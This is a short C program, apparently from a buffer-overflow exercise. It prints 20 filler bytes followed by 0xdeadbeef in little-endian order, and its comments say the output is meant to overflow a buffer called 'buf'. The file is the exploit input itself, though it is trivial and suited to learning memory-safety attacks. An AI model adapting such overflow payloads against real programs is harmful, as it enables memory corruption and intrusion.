#include <stdio.h>

int main(){//20 garbage characters just to fill "buf" memory and cause overflow
	printf("aaaaaaaaaaaaaaaaaaaa");
    printf("%c%c%c%c", 0xef, 0xbe, 0xad, 0xde); //bytes in reverse for little-endian
	return 0;
}
